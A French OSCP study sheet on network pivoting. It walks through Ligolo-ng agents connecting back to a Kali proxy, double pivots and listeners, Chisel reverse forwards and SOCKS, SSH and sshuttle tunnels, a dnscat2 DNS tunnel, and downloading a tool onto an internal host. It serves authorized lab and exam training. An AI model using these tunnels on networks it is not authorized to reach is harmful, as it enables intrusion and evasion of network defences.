---
title: "OSCP · Tunnels et pivot réseau"
description: "Ligolo-ng pas à pas, double pivot, listeners, Chisel et SSH."
---

# Tunnels et pivot réseau

**Objectif :** atteindre un réseau interne autorisé depuis Kali en passant par une machine de pivot. Le **proxy Ligolo-ng** tourne sur Kali ; l'**agent** tourne sur la machine qui peut voir le réseau interne. Le trajet se fait par un tunnel chiffré.

**Adresses fictives à remplacer :** Kali `10.10.14.10` · premier pivot Windows `10.10.10.30` (IP interne `172.16.20.1`) · réseau interne `172.16.20.0/24` · deuxième pivot `172.16.20.30` · second réseau `172.16.30.0/24`.

Chaque bloc précise **où exécuter la commande**. Les commandes `session`, `ifconfig`, `tunnel_start` et `listener_add` se saisissent dans **la console Ligolo**, jamais dans Bash ou PowerShell.

## Avant de commencer

Télécharger les binaires depuis les [versions officielles de Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) : **proxy** pour Kali, **agent** pour Windows/Linux et pour l'architecture concernée. Dans cette fiche, les binaires sont renommés `proxy`, `agent` ou `agent.exe` et placés dans le répertoire courant. Prévoir les droits nécessaires à la création d'une interface TUN sur Kali ; l'agent ne nécessite généralement pas de privilèges administrateur.

**Compatibilité :** choisir des versions compatibles du proxy et de l'agent et vérifier leur architecture (Linux/Windows, amd64/arm64). Vérifier les options disponibles localement avec `./proxy -h` et `./agent -h` (ou `agent.exe -h` sur Windows).

## Ligolo-ng : premier tunnel

**Ordre à suivre :** préparer la TUN → démarrer le proxy Kali → relever l'empreinte TLS → connecter l'agent pivot → sélectionner sa session → démarrer le tunnel → ajouter la route sur Kali → tester un port autorisé.

### Préparer l'interface TUN sur Kali

L'interface TUN transporte les paquets vers Ligolo. Vérifier `ip -br link show ligolo` avant toute création pour éviter `File exists`. Cette méthode manuelle fonctionne avec les versions classiques.

<p class="oscp-command-note">Sur Kali: terminal habituel, avant de lancer le proxy.</p>

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
ip -br link show ligolo
```

### Démarrer le proxy sur Kali

Le binaire `proxy` vient des versions officielles. Le proxy Ligolo écoute par défaut sur TCP 11601 ; autoriser ce port entre l'agent et Kali.

<p class="oscp-command-note">Sur Kali: autre terminal, à laisser ouvert.</p>

```bash
chmod +x ./proxy
./proxy -selfcert
```

### Lire l'empreinte du certificat

Relever l'empreinte TLS SHA-256 réellement affichée par le proxy : l'agent la comparera au certificat présenté lors de la connexion.

<p class="oscp-command-note">Dans la console interactive du proxy Ligolo sur Kali.</p>

```text
certificate_fingerprint
```

### Connecter un agent Windows

Sur Windows pivot, transférer `agent.exe` compatible et remplacer `EMPREINTE_SHA256` par l'empreinte relevée sur Kali ; le port TCP 11601 doit être joignable.

<p class="oscp-command-note">Sur le Windows pivot: PowerShell.</p>

```powershell
.\agent.exe -connect 10.10.14.10:11601 -accept-fingerprint EMPREINTE_SHA256
```

### Connecter un agent Linux

Sur un pivot Linux plutôt que Windows, exécuter l'agent adapté à l'architecture ; les commandes Bash ne s'appliquent pas à Windows.

<p class="oscp-command-note">Sur un pivot Linux: terminal Bash.</p>

```bash
chmod +x ./agent
./agent -connect 10.10.14.10:11601 -accept-fingerprint EMPREINTE_SHA256
```

### Choisir l'agent et repérer son réseau

Dans le proxy Ligolo, `session` sert à sélectionner l'agent connecté ; `ifconfig` affiche ensuite les interfaces de **cet agent**, pas celles de Kali.

<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>

```text
session
ifconfig
```

### Démarrer le tunnel sur l'interface

`ligolo` désigne l'interface TUN **sur Kali** ; sélectionner la bonne session agent avant `tunnel_start`.

<p class="oscp-command-note">Dans la console Ligolo, **après avoir sélectionné la session**.</p>

```text
tunnel_start --tun ligolo
tunnel_list
```

### Ajouter la route du réseau interne

Adapter `172.16.20.0/24` au réseau réellement accessible depuis le pivot. Cette route s'ajoute **sur Kali uniquement**, pas sur Windows.

<p class="oscp-command-note">Sur Kali: terminal Linux différent de la console proxy.</p>

```bash
sudo ip route add 172.16.20.0/24 dev ligolo
ip route get 172.16.20.10
```

### Tester un service du réseau interne

Tester un port autorisé du réseau interne avant un scan étendu. Le routage via TUN Ligolo ne nécessite pas ProxyChains. `--unprivileged` réduit le risque de faux positifs liés aux sondes brutes de Nmap.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
nmap -sT -Pn -n --unprivileged -p 80,445,3389 172.16.20.10
curl -I --max-time 5 http://172.16.20.10/
```

**À savoir :** l'agent Ligolo peut fonctionner sans droits administrateur, mais Kali doit pouvoir créer l'interface TUN. Pour Nmap, commencer par `-sT -Pn`, puis adapter au contexte ; Ligolo traduit certaines sondes TCP en appels `connect()` côté pivot.

## Autre façon de créer l'interface (Ligolo récent)

Avec les versions récentes de Ligolo-ng, la console du proxy peut créer l'interface et ajouter la route. **Choisir cette méthode OU la préparation manuelle précédente, pas les deux**. La création requiert les permissions réseau suffisantes sur Kali.

### Créer l'interface dans la console Ligolo

La console Ligolo crée une interface TUN **sur Kali**, sous réserve des droits réseau du processus proxy.

<p class="oscp-command-note">Dans la console Ligolo sur Kali: alternative aux commandes `ip tuntap`.</p>

```text
interface_create --name ligolo
```

### Ajouter la route depuis la console

Cette commande ajoute sur Kali une route vers le sous-réseau accessible depuis le pivot ; ne pas la cumuler avec une route manuelle identique.

<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>

```text
interface_add_route --name ligolo --route 172.16.20.0/24
```

Ensuite, sélectionner l'agent avec `session`, démarrer avec `tunnel_start --tun ligolo` et tester le routage. Dans les versions récentes, les interfaces et routes peuvent être conservées dans la configuration du proxy.

## Atteindre le localhost du pivot

**Problème :** un service sur `127.0.0.1:8000` du pivot n'est pas accessible directement via son IP réseau. Ligolo réserve `240.0.0.1` pour atteindre **le `127.0.0.1` de l'agent sélectionné** à travers son tunnel.

### Ajouter la route spéciale vers le localhost distant

Cette route doit utiliser l'interface de l'agent concerné.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
curl -I http://240.0.0.1:8000/
```

La réponse HTTP n'existe que si un serveur écoute réellement sur le port `8000` du pivot. Éviter de réutiliser cette même adresse avec plusieurs interfaces simultanées sans contrôler la route.

## Ligolo-ng : double pivot

**Situation :** Kali atteint le premier pivot, mais le deuxième pivot **ne peut pas joindre directement Kali**. Le premier pivot doit relayer le port Ligolo du deuxième agent vers le proxy sur Kali.

```text
Kali (proxy :11601) ⇐ tunnel TLS ⇒ Pivot A (agent Ligolo)
                                       ↑ connexion de Pivot B vers A:11602
                                       │ listener A → Kali:11601
                                 Pivot B (deuxième agent) → réseau 172.16.30.0/24
```

### Créer un listener sur le premier pivot

Le port `11602` est ouvert **sur le pivot A** et redirigé vers `127.0.0.1:11601` **sur Kali**. Ne pas le confondre avec un port ouvert sur Kali.

<p class="oscp-command-note">Dans la console Ligolo, **session du pivot A** sélectionnée.</p>

```text
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
listener_list
```

### Faire connecter le second agent

Pivot B contacte l'IP de Pivot A, pas celle de Kali. Vérifier que Pivot B peut joindre le port 11602 du premier pivot.

<p class="oscp-command-note">Sur le pivot B: PowerShell si Windows.</p>

```powershell
.\agent.exe -connect 172.16.20.1:11602 -accept-fingerprint EMPREINTE_SHA256
```

**Attention à l'IP ci-dessus :** `172.16.20.1` est l'adresse interne du premier pivot A, tandis que `172.16.20.30` est celle du deuxième pivot B. Remplacer ces IP par les vraies interfaces trouvées avec `ifconfig`.

### Créer la seconde interface TUN

Chaque tunnel actif doit avoir sa propre interface ; `ligolo2` est distincte de `ligolo`.

<p class="oscp-command-note">Sur Kali: terminal Linux habituel.</p>

```bash
sudo ip tuntap add user "$USER" mode tun ligolo2
sudo ip link set ligolo2 up
```

### Sélectionner le deuxième agent

Sélectionner la **nouvelle** session apparue pour Pivot B, puis démarrer le deuxième tunnel.

<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>

```text
session
ifconfig
tunnel_start --tun ligolo2
```

### Router le deuxième réseau

Le second sous-réseau passe par `ligolo2`, pas `ligolo`.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
sudo ip route add 172.16.30.0/24 dev ligolo2
ip route get 172.16.30.10
nmap -sT -Pn -n -p 445 172.16.30.10
```

## Listener Ligolo : rendre un service Kali accessible au pivot

Un *listener* est une **redirection de port sur l'agent Ligolo** vers un port qui écoute **sur Kali**. Pratique pour récupérer un fichier depuis Kali lorsque la cible ne peut pas contacter directement `10.10.14.10`.

### Héberger le fichier sur Kali

Servir un dossier uniquement sur `127.0.0.1:8000` ; le listener Ligolo assurera l'accès distant.

<p class="oscp-command-note">Sur Kali: terminal Linux séparé.</p>

```bash
mkdir -p ./partage
python3 -m http.server 8000 --bind 127.0.0.1 --directory ./partage
```

### Exposer ce service sur le pivot A

Le port `8080` écoute sur le **pivot A** (`172.16.20.1`) et redirige vers le serveur HTTP de Kali (`127.0.0.1:8000`).

<p class="oscp-command-note">Dans la console Ligolo: session du pivot A.</p>

```text
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
listener_list
```

### Télécharger depuis une machine interne

La machine Windows interne contacte **le pivot A à `172.16.20.1:8080`**, pas le pivot B (`172.16.20.30`). Le fichier doit exister dans `./partage/` sur Kali.

<p class="oscp-command-note">Sur Windows interne pouvant joindre l'IP réseau du pivot A.</p>

```powershell
Invoke-WebRequest -UseBasicParsing -Uri 'http://172.16.20.1:8080/outil.txt' -OutFile 'C:\Users\Public\outil.txt'
```

Pour **envoyer un fichier vers Kali**, ce serveur HTTP Python ne suffit pas : utiliser **SMB ou WebDAV** comme expliqué dans la [fiche Transferts de fichiers](./transferts.md). Un listener Ligolo peut acheminer ces protocoles si le port et le service de réception sont configurés.

## Chisel : autre solution de pivot

**Chisel** transporte des redirections TCP et un proxy SOCKS dans une connexion client/serveur. Contrairement au tunnel TUN de Ligolo, il peut nécessiter ProxyChains pour les outils qui ne prennent pas en charge SOCKS.

### Démarrer Chisel en mode reverse

Kali écoute sur TCP `8001` et accepte les redirections inverses demandées par le client distant.

<p class="oscp-command-note">Sur Kali: serveur Chisel.</p>

```bash
chisel server --port 8001 --reverse
```

### Rediriger un port interne vers Kali

Le port `8080` sur Kali pointe vers le port `80` du pivot Windows.

<p class="oscp-command-note">Sur le pivot Windows: client Chisel.</p>

```powershell
.\chisel.exe client 10.10.14.10:8001 R:8080:127.0.0.1:80
```

### Tester le port redirigé

La connexion aboutit sur le serveur HTTP du pivot, s'il existe.

<p class="oscp-command-note">Sur Kali: terminal Linux distinct.</p>

```bash
curl -I http://127.0.0.1:8080/
```

### Créer un proxy SOCKS inversé

Le port SOCKS `1080` apparaîtra sur Kali. Garder la commande ouverte pendant l'utilisation.

<p class="oscp-command-note">Sur le pivot Windows: client Chisel.</p>

```powershell
.\chisel.exe client 10.10.14.10:8001 R:1080:socks
```

### Tester un site interne via SOCKS

`--socks5-hostname` demande la résolution du nom côté proxy, utile pour les noms internes.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
curl --socks5-hostname 127.0.0.1:1080 -I http://172.16.20.10/
```

**ProxyChains :** si l'outil n'accepte pas SOCKS directement, ajouter `socks5 127.0.0.1 1080` à la section `[ProxyList]` du fichier `/etc/proxychains4.conf`, puis préfixer la commande par `proxychains4`. Dans Nmap, privilégier `-sT -Pn` derrière un proxy SOCKS.

## SSH : alternative simple avec un compte valide

**Quand utiliser SSH ?** Lorsque le pivot possède déjà un serveur SSH et que vous avez des identifiants autorisés. Pour les transferts de fichiers, utiliser [SCP](./transferts.md).

### Redirection SSH locale

Le port `8080` local dirige le trafic vers `172.16.20.10:80` depuis l'hôte SSH.

<p class="oscp-command-note">Sur Kali: le serveur SSH a accès au service interne.</p>

```bash
ssh -N -L 127.0.0.1:8080:172.16.20.10:80 etudiant@10.10.10.30
```

### Proxy SOCKS par SSH

Un proxy SOCKS local apparaît sur le port `9050` de Kali.

<p class="oscp-command-note">Sur Kali: accès SSH à un pivot.</p>

```bash
ssh -N -D 127.0.0.1:9050 etudiant@10.10.10.30
```

### Routage réseau avec sshuttle

Acheminer le sous-réseau entier par le pivot, sans installer un agent Ligolo.

<p class="oscp-command-note">Sur Kali: sshuttle et SSH accessibles.</p>

```bash
sshuttle -r etudiant@10.10.10.30 172.16.20.0/24
```

## Tunnel DNS avec dnscat2

Alternative avancée, réservée au laboratoire dont les échanges DNS sont autorisés. **Ce n'est pas une étape nécessaire pour Ligolo-ng** : elle est conservée séparément pour éviter de mélanger les outils.

### Démarrer le serveur dnscat2

Remplacer le domaine par un domaine appartenant au laboratoire et définir un secret partagé.

<p class="oscp-command-note">Sur la machine Linux qui héberge le serveur DNS contrôlé.</p>

```bash
dnscat2-server laboratoire.example --secret 'SecretDeTest'
```

### Connecter un client dnscat2

Utiliser le domaine et le secret correspondants ; la résolution DNS doit parvenir au serveur.

<p class="oscp-command-note">Sur le client Linux de laboratoire.</p>

```bash
./dnscat --secret='SecretDeTest' laboratoire.example
```

La disponibilité et les options de `dnscat2` dépendent de l'installation. Exécuter `dnscat2-server --help` et `./dnscat --help` pour la version locale.

## Dépannage Ligolo-ng

| Symptôme | Cause à vérifier |
|---|---|
| L'agent n'apparaît pas | Proxy en écoute ? IP Kali correcte ? TCP 11601 joignable ? |
| Empreinte TLS refusée | Copier l'empreinte exacte du proxy avec `certificate_fingerprint` |
| `no such device` / TUN absent | Créer l'interface et vérifier `ip -br link` sur Kali |
| `RTNETLINK answers: File exists` | La route existe déjà ; consulter `ip route` avant de la modifier |
| Tunnel lancé mais réseau inaccessible | Mauvaise session, mauvais sous-réseau, pare-feu ou route locale absente |
| Second agent non connecté | Le listener est ouvert sur le bon **premier pivot**, et joignable depuis le second ? |
| Réseau local de l'agent inaccessible | Utiliser `240.0.0.1/32` pour son `127.0.0.1` avec la bonne interface |
| Port redirigé muet | Vérifier le vrai service sur Kali et l'adresse `--to` du listener |

## Arrêter et nettoyer

### Fermer le tunnel

Arrêter le tunnel sélectionné. Les listeners sont indépendants : les fermer aussi si nécessaire.

<p class="oscp-command-note">Dans la console Ligolo: sélectionner la bonne session.</p>

```text
session
tunnel_stop
listener_list
```

### Supprimer la route après l'examen

Retirer les routes manuelles ajoutées pour la session, sans toucher aux routes VPN préexistantes.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
sudo ip route del 172.16.20.0/24 dev ligolo
sudo ip route del 172.16.30.0/24 dev ligolo2
```

Si les interfaces ont été créées manuellement et ne servent plus, vérifier leurs usages avant `sudo ip link delete ligolo` ou `sudo ip link delete ligolo2`. Les routes créées automatiquement par des versions récentes peuvent être gérées par Ligolo.

## Sources officielles

- [Ligolo-ng: introduction et limites réseau](https://docs.ligolo.ng/)

- [Ligolo-ng: Quickstart, interface, certificat et routage](https://docs.ligolo.ng/Quickstart/)

- [Ligolo-ng: double pivot](https://docs.ligolo.ng/sample/double/)

- [Ligolo-ng: listeners](https://docs.ligolo.ng/Listeners/)

- [Ligolo-ng: accès au localhost de l'agent](https://docs.ligolo.ng/Localhost/)

- [Ligolo-ng: configuration v0.8 et routes persistantes](https://docs.ligolo.ng/Config-File/)

- [Notes krovs: tunnels complémentaires](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md)